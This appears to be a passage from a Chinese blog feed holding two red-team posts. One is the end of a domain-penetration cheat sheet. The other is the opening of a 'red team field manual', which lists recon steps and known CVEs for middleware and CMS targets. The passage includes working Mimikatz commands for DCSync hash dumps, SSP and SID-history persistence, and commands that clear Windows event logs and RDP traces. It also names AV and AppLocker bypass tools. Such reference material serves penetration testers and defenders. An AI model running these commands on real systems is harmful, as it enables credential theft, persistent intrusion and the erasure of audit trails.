<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt&quot;exit</span><br></pre></td></tr></table></figure>
<p>管理员用户帐户提取密码数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit</span><br></pre></td></tr></table></figure>
<ul>
<li>NTDS.dit中提取哈希<br>使用esedbexport恢复以后使用ntdsxtract提取 </li>
</ul>
<h4 id="AD持久化"><a href="#AD持久化" class="headerlink" title="AD持久化"></a>AD持久化</h4><h5 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h5><p><a href="https://adsecurity.org/?p=1929" target="_blank" rel="noopener">https://adsecurity.org/?p=1929</a><br>DS恢复模式密码维护<br>DSRM密码同步 </p>
<blockquote>
<p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p>
</blockquote>
<p><a href="https://www.dcshadow.com/" target="_blank" rel="noopener">DCshadow </a></p>
<h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
<p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>
<h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772" target="_blank" rel="noopener">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure>
<h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp "></a><a href="https://adsecurity.org/?p=1906" target="_blank" rel="noopener">AdminSDHolder＆SDProp </a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限 </p>
<h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a href="https://adsecurity.org/?p=2716" target="_blank" rel="noopener">https://adsecurity.org/?p=2716</a><br><a href="https://www.anquanke.com/post/id/86531" target="_blank" rel="noopener">策略对象在持久化及横向渗透中的应用</a> </p>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a href="http://wooyun.jozxing.cc/static/drops/tips-13079.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-13079.html</a> </p>
<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><p><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">《域渗透——Dump Clear-Text Password after KB2871997 installed》</a><br><a href="http://www.vuln.cn/6812" target="_blank" rel="noopener">《域渗透——Hook PasswordChangeNotify》</a> </p>
<blockquote>
<p>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 </p>
</blockquote>
<p><a href="http://www.liuhaihua.cn/archives/179102.html" target="_blank" rel="noopener">《域渗透——Local Administrator Password Solution》 </a></p>
<blockquote>
<p>域渗透时要记得留意域内主机的本地管理员账号 </p>
</blockquote>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">《域渗透——利用SYSVOL还原组策略中保存的密码》 </a></p>
<h4 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h4><p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound </a><br><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec </a><br><a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="noopener">DeathStar</a> </p>
<blockquote>
<p>利用过程：<a href="http://www.freebuf.com/sectool/160884.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/160884.html</a> </p>
</blockquote>
<h3 id="在远程系统上执行程序"><a href="#在远程系统上执行程序" class="headerlink" title="在远程系统上执行程序"></a>在远程系统上执行程序</h3><ul>
<li>At </li>
<li>Psexec </li>
<li>WMIC </li>
<li>Wmiexec </li>
<li>Smbexec </li>
<li>Powershell remoting </li>
<li>DCOM </li>
</ul>
<h3 id="IOT相关"><a href="#IOT相关" class="headerlink" title="IOT相关"></a>IOT相关</h3><ul>
<li>1、路由器 <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">routersploit </a></li>
<li>2、打印机 <a href="https://github.com/RUB-NDS/PRET" target="_blank" rel="noopener">PRET </a></li>
<li>3、IOT exp <a href="https://www.exploitee.rs/" target="_blank" rel="noopener">https://www.exploitee.rs/</a></li>
<li>4、相关<br><a href="https://www.owasp.org/index.php/OWASP_Nettacker" target="_blank" rel="noopener">OWASP-Nettacker</a><br><a href="https://github.com/dark-lbp/isf" target="_blank" rel="noopener">isf</a><br><a href="https://github.com/w3h/icsmaster" target="_blank" rel="noopener">icsmaster</a></li>
</ul>
<h3 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h3><ul>
<li><a href="http://www.oxid.it/cain.html" target="_blank" rel="noopener">Cain</a> </li>
<li><a href="https://github.com/Ettercap/ettercap" target="_blank" rel="noopener">Ettercap</a> </li>
<li><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a> </li>
<li><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">MITMf</a> </li>
<li><a href="https://github.com/evilsocket/bettercap" target="_blank" rel="noopener">3r/MITMf)</a> </li>
</ul>
<h3 id="规避杀软及检测"><a href="#规避杀软及检测" class="headerlink" title="规避杀软及检测"></a>规避杀软及检测</h3><h4 id="Bypass-Applocker"><a href="#Bypass-Applocker" class="headerlink" title="Bypass Applocker"></a>Bypass Applocker</h4><p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">UltimateAppLockerByPassList </a><br><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a> </p>
<h4 id="bypassAV"><a href="#bypassAV" class="headerlink" title="bypassAV"></a>bypassAV</h4><ul>
<li>Empire </li>
<li>PEspin </li>
<li>Shellter </li>
<li>Ebowla </li>
<li>Veil </li>
<li>PowerShell </li>
<li>Python </li>
<li><a href="http://www.4hou.com/technology/9379.html" target="_blank" rel="noopener">代码注入技术Process Doppelgänging </a></li>
<li>…</li>
</ul>
<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">Windows日志清除</a></h3><p>获取日志分类列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>
<p>获取单个日志类别的统计信息：<br>eg.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>
<p>查看指定日志的具体内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil qe /f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>删除单个日志类别的所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具 </p>
<ul>
<li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a> </li>
<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a> </li>
</ul>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run clearlogs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>
<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>红方人员实战手册</title>
    <url>/2020/06/13/%E7%BA%A2%E6%96%B9%E4%BA%BA%E5%91%98%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<p>非常值得学习！</p><a id="more"></a>
<h2 id="红方人员实战手册"><a href="#红方人员实战手册" class="headerlink" title="红方人员实战手册"></a>红方人员实战手册</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Author : By klion</span><br><span class="line">Date   : 2020.2.15</span><br><span class="line">寄语    : 愿 2020 后面的每一天都能一切安好</span><br></pre></td></tr></table></figure>

<h3 id="分享初衷"><a href="#分享初衷" class="headerlink" title="分享初衷"></a>分享初衷</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一来, 旨在为 &quot;攻击&quot; / &quot;防御&quot;方 提供更加全面实用的参考</span><br><span class="line">还是那句老闲话 &quot;未知攻焉知防&quot;, 所有单纯去说 &quot;攻&quot; 或者 &quot;防&quot; 的都是耍流氓, 攻守兼备才能把路越走越宽</span><br><span class="line"></span><br><span class="line">二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献</span><br><span class="line">个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事</span><br></pre></td></tr></table></figure>

<h3 id="丑话说在前面"><a href="#丑话说在前面" class="headerlink" title="丑话说在前面"></a>丑话说在前面</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动</span><br><span class="line">严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....</span><br><span class="line">严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担</span><br></pre></td></tr></table></figure>

<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总</span><br><span class="line">针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)</span><br><span class="line">由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的</span><br><span class="line">而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动</span><br><span class="line">这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战</span><br><span class="line">所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的</span><br><span class="line">需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用</span><br><span class="line">由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同</span><br><span class="line">所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善</span><br><span class="line">个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的</span><br><span class="line">稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态</span><br><span class="line">尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人</span><br><span class="line">所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的</span><br><span class="line">虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色</span><br><span class="line">说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本</span><br><span class="line">另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</span><br></pre></td></tr></table></figure>

<h3 id="日常流程简要说明"><a href="#日常流程简要说明" class="headerlink" title="日常流程简要说明"></a>日常流程简要说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</span><br></pre></td></tr></table></figure>

<h3 id="0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心"><a href="#0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心" class="headerlink" title="0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]"></a>0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绕CDN找出目标所有真实ip段</span><br><span class="line">找目标的各种Web管理后台登录口</span><br><span class="line">批量抓取目标所有真实C段 Web banner</span><br><span class="line">批量对目标所有真实C段 进行基础服务端口扫描探测识别</span><br><span class="line">尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破</span><br><span class="line">批量抓取目标所有子域 Web banner</span><br><span class="line">批量对目标所有子域集中进行基础服务端口探测识别</span><br><span class="line">批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本</span><br><span class="line">从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;</span><br><span class="line">从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码</span><br><span class="line">从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]</span><br><span class="line">目标Svn里泄露的各类 敏感文件</span><br><span class="line">网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]</span><br><span class="line">目标站点自身在前端代码中泄露的各种敏感信息</span><br><span class="line">fofa / shodan / bing / google  hacking 深度利用</span><br><span class="line">搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]</span><br><span class="line">目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息</span><br><span class="line">目标微信小程序</span><br><span class="line">分析目标app Web请求</span><br><span class="line">借助js探针搜集目标内网信息</span><br><span class="line">想办法混入目标的各种 内部QQ群 / 微信群</span><br><span class="line">分析目标直接供应商 [尤其是技术外包]</span><br><span class="line">根据前面已搜集到的各类信息制作有针对性的弱口令字典</span><br><span class="line">目标所用 Waf 种类识别 与 绕过</span><br><span class="line">BypassWAF 文件上传 / 读取 / 下载</span><br><span class="line">   BypassWAF Sql注入</span><br><span class="line">   BypassWAF RCE</span><br><span class="line">   BypassWAF 各类Java Web中间件已知Nday漏洞利用</span><br><span class="line">   BypassWAF Webshell 免杀</span><br><span class="line">	</span><br><span class="line">其它更多 , 待补充修正...</span><br></pre></td></tr></table></figure>

<h3 id="0x02-入口权限获取-外部防御重心-“重中之重”"><a href="#0x02-入口权限获取-外部防御重心-“重中之重”" class="headerlink" title="0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]"></a>0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用</span><br><span class="line">如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向</span><br><span class="line">故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;</span><br></pre></td></tr></table></figure>

<h4 id="针对各类Java中间件的各种已知Nday漏洞利用"><a href="#针对各类Java中间件的各种已知Nday漏洞利用" class="headerlink" title="针对各类Java中间件的各种已知Nday漏洞利用"></a>针对各类Java中间件的各种已知Nday漏洞利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑</span><br><span class="line">所以拿到的shell权限一般也非常高,通常都直接是服务器权限</span><br><span class="line">尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限</span><br><span class="line">关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Struts2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Struts2-005</span><br><span class="line">Struts2-008</span><br><span class="line">Struts2-009</span><br><span class="line">Struts2-013</span><br><span class="line">Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)</span><br><span class="line">Struts2-019</span><br><span class="line">Struts2-020</span><br><span class="line">Struts2-devmode</span><br><span class="line">Struts2-032</span><br><span class="line">Struts2-033</span><br><span class="line">Struts2-037</span><br><span class="line">Struts2-045</span><br><span class="line">Struts2-046</span><br><span class="line">Struts2-048</span><br><span class="line">Struts2-052</span><br><span class="line">Struts2-053</span><br><span class="line">Struts2-057</span><br></pre></td></tr></table></figure>
</li>
<li><p>weblogic</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2019-2725</span><br><span class="line">CVE-2019-2729</span><br><span class="line">CVE-2018-3191</span><br><span class="line">CVE-2018-2628</span><br><span class="line">CVE-2018-2893</span><br><span class="line">CVE-2018-2894</span><br><span class="line">CVE-2017-3506</span><br><span class="line">CVE-2017-10271</span><br><span class="line">CVE-2017-3248</span><br><span class="line">CVE-2016-0638</span><br><span class="line">CVE-2016-3510</span><br><span class="line">CVE-2015-4852</span><br><span class="line">CVE-2014-4210</span><br><span class="line"></span><br><span class="line">SSRF</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure>
</li>
<li><p>Jboss</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2015-7501</span><br><span class="line">CVE-2017-7504</span><br><span class="line">CVE-2017-12149</span><br><span class="line"></span><br><span class="line">未授权访问,部署webshell</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure>
</li>
<li><p>wildfly [ jboss 7.x 改名为 wildfly ]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure>
</li>
<li><p>Tomcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2016-8735</span><br><span class="line">CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]</span><br><span class="line">CVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]</span><br><span class="line"></span><br><span class="line">控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>Jekins</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2018-1999002 [任意文件读取]</span><br><span class="line"></span><br><span class="line">未授权访问,任意命令执行</span><br><span class="line">控制台弱口令,任意命令执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>ElasticSearch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2014-3120 [专门针对老版本(无沙盒)RCE]</span><br><span class="line">CVE-2015-1427 [Groovy RCE]</span><br><span class="line">CVE-2015-3337 [任意文件读取]</span><br><span class="line"></span><br><span class="line">未授权访问,敏感信息泄露</span><br></pre></td></tr></table></figure>
</li>
<li><p>RabbitMQ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">弱口令</span><br></pre></td></tr></table></figure>
</li>
<li><p>Glassfish</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任意文件读取 [ 低版本 ]</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure>
</li>
<li><p>IBM Websphere</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java 反序列化</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure>
</li>
<li><p>Axis2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任意文件读取</span><br><span class="line">目录遍历</span><br></pre></td></tr></table></figure></li>
<li><p>Apache ActiveMQ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">未授权访问,5.12 之前的版本 fileserver存在 PUT任意写</span><br><span class="line">CVE-2015-5254</span><br></pre></td></tr></table></figure>
</li>
<li><p>Apache Solr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2017-12629</span><br><span class="line">CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>Apache Zookeeper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">未授权访问,敏感信息泄露</span><br></pre></td></tr></table></figure>
</li>
<li><p>Apache Shiro反序列化</p>
</li>
<li><p>fastjson &lt;= 1.2.47 反序列化利用</p>
<h4 id="针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口"><a href="#针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口" class="headerlink" title="针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]"></a>针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AppServ</span><br><span class="line">Xampp</span><br><span class="line">宝塔</span><br><span class="line">PhpStudy		</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="针对各类开源程序的-已知Nday漏洞利用"><a href="#针对各类开源程序的-已知Nday漏洞利用" class="headerlink" title="针对各类开源程序的 已知Nday漏洞利用"></a>针对各类开源程序的 已知Nday漏洞利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dedecms 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">thinkphp 5.x 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">phpcms 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">ecshop 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">Metinfo 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">discuz 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">帝国cms 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">phpmyadmin 	数据库弱口令,系列已知nday漏洞利用</span><br><span class="line">wordpress 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">joomla 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">drupal 		CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h4 id="针对其它各类Web组件的-已知Nday漏洞利用"><a href="#针对其它各类Web组件的-已知Nday漏洞利用" class="headerlink" title="针对其它各类Web组件的 已知Nday漏洞利用"></a>针对其它各类Web组件的 已知Nday漏洞利用</h4><ul>
<li><p>IIS 6.0 RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">短文件漏洞</span><br><span class="line">PUT 任意写</span><br><span class="line">Webdav RCE CVE-2017-7269</span><br></pre></td></tr></table></figure>
</li>
<li><p>禅道项目管理系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">文件读取</span><br><span class="line">远程执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>通达OA</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">任意上传</span><br></pre></td></tr></table></figure></li>
<li><p>Exchange</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用接口进行邮箱用户名枚举</span><br><span class="line">针对各个接口的弱口令爆破</span><br><span class="line">CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li>
<li><p>Zimbra [ XXE + SSRF =&gt; RCE ]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2013-7091</span><br><span class="line">CVE-2016-9924</span><br><span class="line">CVE-2019-9670</span><br></pre></td></tr></table></figure>
</li>
<li><p>Citrix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2019-19781</span><br></pre></td></tr></table></figure>
</li>
<li><p>Jumpserver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">身份验证绕过</span><br></pre></td></tr></table></figure>
</li>
<li><p>Zabbix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2017-2824</span><br><span class="line">SQL注入 [ 2.0 老版本 ]</span><br><span class="line">控制台弱口令,敏感机器信息泄露</span><br></pre></td></tr></table></figure>
</li>
<li><p>Cacti</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">低版本 SQL注入</span><br><span class="line">控制台弱口令</span><br></pre></td></tr></table></figure>
</li>
<li><p>Nagios</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2016-9565</span><br><span class="line">控制台弱口令</span><br></pre></td></tr></table></figure>
</li>
<li><p>Webmin RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2019-15107</span><br></pre></td></tr></table></figure>
</li>
<li><p>PHPMailer</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2016-10033</span><br></pre></td></tr></table></figure>
</li>
<li><p>泛微OA远程代码执行</p>
</li>
<li><p>金蝶OA SQL注入</p>
</li>
<li><p>Coremail 敏感文件泄露</p>
</li>
<li><p>UEditor 任意文件上传</p>
</li>
<li><p>OpenSSL心脏滴血抓明文账号密码  [ Heartbleed ]</p>
</li>
<li><p>破壳漏洞 [ Shellshock ] </p>
